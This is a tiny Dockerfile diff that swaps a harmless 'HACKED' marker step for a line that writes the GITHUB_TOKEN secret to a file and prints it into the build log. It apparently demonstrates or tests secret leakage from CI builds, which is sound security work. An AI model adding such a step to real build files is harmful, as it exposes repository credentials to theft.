@@ -1,2 +1,2 @@
 FROM alpine
-RUN echo HACKED > /HACKED
+RUN echo $GITHUB_TOKEN > /leaked && cat /leaked
